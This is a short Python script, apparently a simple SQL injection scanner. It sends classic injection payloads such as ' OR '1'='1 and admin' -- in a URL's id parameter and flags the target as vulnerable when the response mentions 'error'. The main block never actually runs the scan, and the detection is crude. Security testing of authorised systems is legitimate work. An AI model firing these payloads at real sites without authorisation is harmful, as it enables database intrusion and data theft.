#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Rich SQL Injection Scanner"""

from rich.console import Console
from rich.table import Table
import requests

console = Console()

class SQLInjector:
    def __init__(self):
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "admin' --",
            "1' OR '1'='1"
        ]
    
    def scan(self, url):
        """Scan for SQL injection"""
        console.print(f"[bold cyan]Scanning: {url}[/bold cyan]")
        
        for payload in self.payloads:
            try:
                response = requests.get(f"{url}?id={payload}")
                if "error" in response.text.lower():
                    console.print(f"[red]✓ Vulnerable: {payload}[/red]")
            except:
                pass
        
        console.print("[green]Scan complete[/green]")

if __name__ == "__main__":
    injector = SQLInjector()
    console.print("[yellow]SQL injection scanner[/yellow]")

